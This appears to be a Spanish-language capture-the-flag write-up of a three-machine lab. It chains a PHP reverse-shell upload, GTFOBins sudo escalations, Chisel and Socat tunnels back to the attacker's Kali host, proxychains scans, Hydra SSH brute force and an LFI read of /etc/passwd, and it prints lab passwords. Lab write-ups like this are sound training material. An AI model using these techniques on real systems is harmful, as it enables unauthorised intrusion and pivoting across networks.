Máquinas vulnerables:
![](../../../Images/Pasted%20image%2020240828085032.png)
Voy a empezar desde la máquina Upload e ir pivotando hasta la Trust para finalmente llegar a la Inclusion 

Escaneo de puertos máquina Upload:
![](../../../Images/Pasted%20image%2020240828085345.png)

Reviso qué contiene el puerto 80:
![](../../../Images/Pasted%20image%2020240828085417.png)
Tengo una subida de archivos

Subiré una RevShell en PHP:
![](../../../Images/Pasted%20image%2020240828085555.png)

Ahora haré fuzzing web con Gobuster para encontrar el directorio donde se subió mi archivo:
![](../../../Images/Pasted%20image%2020240828085650.png)
Tengo el directorio /uploads

Accedo a él:
![](../../../Images/Pasted%20image%2020240828085711.png)
Y acá está mi archivo

Me pongo a la escucha con NetCat y doy click en mi archivo:
![](../../../Images/Pasted%20image%2020240828085748.png)
Y recibo conexión, ahora estoy dentro de la máquina Upload

Tratamiento de la TTY
![](../../../Images/Pasted%20image%2020240828090000.png)
![](../../../Images/Pasted%20image%2020240828090020.png)

## ESCALADA DE PRIVILEGIOS - UPLOAD

Ejecuto sudo -l para ver el binario que puedo usar 
![](../../../Images/Pasted%20image%2020240828090133.png)
Puedo ser root con el binario Env

Miro en GTFOBins como puedo escalar con este binario:
![](../../../Images/Pasted%20image%2020240828090150.png)

Lo ejecuto:
![](../../../Images/Pasted%20image%2020240828090238.png)
Y ahora soy ROOT en la máquina Upload

Para comenzar a hacer el pivoting hacia la máquina Trust me pasaré Chisel y Socat a esta máquina Upload, levantaré con Python un servidor para pasarme estas herramientas:
![](../../../Images/Pasted%20image%2020240828090540.png)

Ahora ya que tengo Chisel en ambos lugares (la máquina Upload y mi kali), me pondré a la  escucha desde mi kali por el puerto 1234:
```
./chisel server --reverse -p 1234
```

Ahora le daré permisos de ejecución a Chisel desde la máquina para crear el túnel donde enviaré información:
```
./chisel client 192.168.1.232:1234 R:socks
```
![](../../../Images/Pasted%20image%2020240828090856.png)
Se creó un tunel por el puerto 1080 de mi localhost:
![](../../../Images/Pasted%20image%2020240828094351.png)

Ahora crearé un tunel con Socat desde la máquina Upload hacia mi kali para que  todo lo que pase por esta máquina me llegue a mi kali:
```
./socat TCP-LISTEN:1111,fork TCP:192.168.1.232:443
```
![](../../../Images/Pasted%20image%2020240828114625.png)

Ahora para no tener problemas al usar mis herramientas apuntando hacia esta máquina Trust editaré el archivo /etc/proxychains4.conf, le pondré el puerto por el cual corre mi túnel:
![](../../../Images/Pasted%20image%2020240815084716.png)

Ahora si, haré un escaneo de puertos de la máquina Trust, siempre colocando el comando Proxychains antes de cualquier herramienta que apunte hacia la máquina que pasa por el túnel:
```
proxychains nmap -p- -sT -n -vvv -Pn 20.20.20.3 2>/dev/null
```
![](../../../Images/Pasted%20image%2020240828095656.png)

Para ver que corre en el puerto 80 en Firefox voy a configuración de red y coloco lo siguiente:
![](../../../Images/Pasted%20image%2020240828094534.png)
Ahora si puedo ver que hay en el puerto 80:
![](../../../Images/Pasted%20image%2020240828095806.png)
Tengo una plantilla de Apache2

Haciendo fuzzing web  con Gobuster nos encontramos un /Secret.php:
```
proxychains gobuster dir -u http://20.20.20.3 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,php,txt,php.bak --proxy socks5://127.0.0.1:1080
```
![](../../../Images/Pasted%20image%2020240828095939.png)
Accedo a el:
![](../../../Images/Pasted%20image%2020240828100007.png)
Tengo un usuario llamado mario

Anteriormente en el escaneo de puertos vi que estaba abierto el puerto 22 (SSH) entonces le haré un ataque de fuerza bruta con Hydra hacia este usuario para encontrar la posible contraseña:
![](../../../Images/Pasted%20image%2020240828100303.png)
Me da como contraseña chocolate del usuario mario

Intrusión por el puerto 22 SSH de la máquina Trust:
![](../../../Images/Pasted%20image%2020240828100440.png)
Y listo, estoy dentro de la máquina Trust

## ESCALADA DE PRIVILEGIOS - TRUST

Ejecuto sudo -l para ver el binario que puedo usar:
![](../../../Images/Pasted%20image%2020240705195059%201.png)
Puedo usar el binario Vim para hacer la escalada a root

Miro en GTFOBins como puedo escalar con este binario:
![](../../../Images/Pasted%20image%2020240705203729.png)

Lo ejecuto:
![](../../../Images/Pasted%20image%2020240705195243%201.png)

Y listo ya soy ROOT en la máquina Trust

Para seguir el pivoting hacia la máquina Inclusion me pasaré Chisel y Socat a esta máquina Trust, levantaré con Python un servidor para pasarme estas herramientas desde Upload:
![](../../../Images/Pasted%20image%2020240828101926.png)

Ahora ya que tengo Socat en ambos lugares (la máquina Upload y la máquina Trust), me pondré a la  escucha desde la máquina Upload por el puerto 2222:
```
./socat TCP-LISTEN:2222,fork TCP:192.168.1.232:1234
```
![](../../../Images/Pasted%20image%2020240828120359.png)
Ahora le daré permisos de ejecución a Chisel desde la máquina Trust para crear el túnel donde enviaré información por el puerto  2222 hacia la máquina Upload y por el puerto 5555 hacia mi kali:
```
./chisel client 20.20.20.2:2222 R:5555:socks
```
![](../../../Images/Pasted%20image%2020240828120526.png)

Y ahora desde mi kali recibí el tunel del puerto 5555:
![](../../../Images/Pasted%20image%2020240828120703.png)
Editaré el archivo /etc/proxychains4.conf con este puerto, para poder tener conexión con esta máquina Inclusion 
![](../../../Images/Pasted%20image%2020240828120832.png)

Escaneo de puertos máquina inclusion:

Para ver que corre en el puerto 80 de esta última máquina en Firefox voy a configuración de red y coloco lo siguiente:
![](../../../Images/Pasted%20image%2020240828121457.png)

Veamos lo que hay en el puerto 80:
![](../../../Images/Pasted%20image%2020240828121552.png)
Tengo una plantilla de Apache2

Haré fuzzing web con Gobuster:
![](../../../Images/Pasted%20image%2020240828121747.png)
Tengo el directorio /shop

Accedo a él:
![](../../../Images/Pasted%20image%2020240828121820.png)
Y al final de la página me da una pista de que tiene una vulnerabilidad de LFI con el parámetro "archivo", lo usaré  para leer los usuarios de la carpeta /etc/passwd:
![](../../../Images/Pasted%20image%2020240828122539.png)
Tengo 2 usuarios seller y manchi haremos fuerza bruta con Hydra por el puerto 22 para encontrar la el usuario correcto y la contraseña de ese respectivo usuario:
![](../../../Images/Pasted%20image%2020240828122805.png)
El usuario es manchi y su contraseña es lovely

Intrusión por el puerto 22 SSH de la máquina Inclusion
![](../../../Images/Pasted%20image%2020240828122911.png)

## ESCALADA DE PRIVILEGIOS - INCLUSION

Recordando tenemos otro usuario llamado seller con la contraseña qwerty, por ende escalaremos a este usuario
![](../../../Images/Pasted%20image%2020240828172846.png)
Ya somos el usuario seller

Ejecuto sudo -l para ver el binario que puedo usar 
![](../../../Images/Pasted%20image%2020240828123740.png)
Puedo ser root con el binario Php

Miro en GTFOBins como puedo escalar con este binario:
![](../../../Images/Pasted%20image%2020240828123847.png)

Lo ejecuto:
![](../../../Images/Pasted%20image%2020240828124018.png)
Y listo ya soy ROOT en la ultima máquina del pivoting, la Inclusion

![](../../../Images/Pasted%20image%2020240831141100.png)
![](../../../Images/Pasted%20image%2020240831141109.png)
![](../../../Images/Pasted%20image%2020240831141114.png)
![](../../../Images/Pasted%20image%2020240831141119.png)
